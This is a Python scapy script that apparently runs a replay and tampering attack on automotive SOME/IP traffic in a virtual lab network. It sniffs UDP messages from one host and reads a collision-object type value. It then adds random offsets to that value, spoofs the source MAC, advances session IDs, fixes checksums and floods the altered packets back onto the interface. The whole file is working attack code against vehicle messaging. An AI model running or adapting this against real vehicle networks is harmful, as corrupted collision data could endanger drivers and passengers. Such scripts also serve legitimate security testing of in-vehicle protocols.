from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import Replay
import pdb
import time
import struct
import numpy as np

variables = [random.randint(1, 3) for _ in range(100)]
index = 0

def process_packet(packet):
    global index
    collision_obj_type = struct.unpack('>i', bytes(packet[SOMEIP].payload))[0]

    packets = []
    for _ in range(Replay.packet_series_count):
        collision_obj_type_tempered = collision_obj_type + variables[index]
        index += 1
        if index >= 100:
            index = 0
        data = struct.pack('>i', collision_obj_type_tempered)
        packet[SOMEIP].payload = Raw(load=data)
        packet[IP].ttl = 5
        packet[Ether].src = '00:00:00:00:00:08'
        packet[SOMEIP].session_id += 10
        if packet[SOMEIP].session_id >= 65535:
            packet[SOMEIP].session_id = 1
        packet = update_udp_chksum(packet)
        packets.append(packet)

    print(f"[Replay] collision_obj_type_orig({collision_obj_type}), collision_obj_type_temp({collision_obj_type_tempered})")
    sendp(packets, iface='veth0.3', inter=Replay.collision_interval)

filter = "udp and src host 10.0.3.7 and src port 33003"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

